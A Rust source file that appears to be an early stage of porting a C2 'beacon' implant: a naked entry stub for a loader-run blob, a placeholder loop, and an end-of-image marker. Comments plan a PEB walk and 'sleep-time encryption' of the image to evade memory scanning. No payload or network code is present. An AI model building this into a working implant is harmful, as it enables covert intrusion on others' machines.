//! Entry point and bootstrap (port of `src_beacon/asm/entry.x64.asm`).
//!
//! The blob starts with the entry stub: the loader jumps to the first byte of
//! the extracted .text. Phase 0 keeps it minimal — phase 1 will grow the real
//! bootstrap (PEB walk, heap, instance setup) — but the contract is fixed:
//! `SptEntry` is the first function of the blob and never returns.

use core::arch::naked_asm;

/// Beacon entry point. Merged first in .text; never returns.
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "C" fn SptEntry() {
    naked_asm!(
        "sub rsp, 8",          // keep the stack 16-byte aligned after the call
        "call {main}",
        "ud2",                 // spt_main never returns
        main = sym spt_main,
    );
}

/// Phase-0 stub main loop. Phase 1 replaces this with the real bootstrap.
#[unsafe(no_mangle)]
pub unsafe extern "C" fn spt_main() -> ! {
    loop {
        core::hint::spin_loop();
    }
}

/// End-of-beacon marker (port of the `.sptend` section from Linker.ld).
/// The runtime uses it to compute the beacon extent (e.g. for sleep-time
/// encryption of the whole image); it must remain the last bytes of the blob.
/// The magic makes the marker recognizable in the raw blob (no symbol table
/// survives the final link).
#[used]
#[unsafe(no_mangle)]
#[unsafe(link_section = ".sptend")]
pub static SPT_END: [u8; 8] = *b"SPT_END\x00";
